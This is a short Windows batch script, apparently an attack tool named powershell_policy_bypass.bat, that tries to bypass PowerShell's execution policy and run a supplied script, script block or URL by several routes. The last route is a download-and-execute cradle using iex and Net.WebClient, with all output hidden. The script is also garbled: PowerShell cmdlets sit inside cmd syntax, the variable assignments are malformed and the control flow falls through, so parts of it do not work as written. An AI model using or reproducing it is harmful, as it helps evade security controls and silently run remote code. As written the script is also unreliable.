@echo on
set to_execute = %1
set arguments_count = 0
set quit = "exit /b 0" 
set no_profile_exec = "powershell.exe -noprofile -"
set output_sink = ">nul 2>nul"

for %%x in (%*) do Set /A arguments_count+=1

:SHOW_HELP
	echo "* Usage: "
	echo "* powershell_policy_bypass.bat <source>"
	echo "* The source can be defined as a script, url or a script block"
	%quit%

:CONTAINS
	Echo.%1 | findstr /C:"%2">nul && (
    	REM TRUE
	) || (
    	REM FALSE
	)
	%quit%

:PRINT_STATUS error_code, component

if %arguments_count% equ 0 (
	call :SHOW_HELP
)

if %arguments_count%  equ 1 (
	if %to_execute% == "-h" (
		call :SHOW_HELP
	)
)


Set-ExecutionPolicy Bypass -Scope Process
if %errorlevel% equ 1(
	echo "[X] Cannot bypass execution policy using 'Set-ExecutionPolicy'"
	%quit%
) else (
	echo "[+] Bypassed execution policy usinf 'Set-ExecutionPolicy'"
)

echo %to_execute% | %no_profile_exec% %output_sink%
Get-Content %to_execute% |%no_profile_exec% %output_sink%
TYPE %to_execute% | %no_profile_exec% %output_sink%
powershell.exe -nop -c "iex(New-Object Net.WebClient).DownloadString('%to_execute%')" %output_sink%

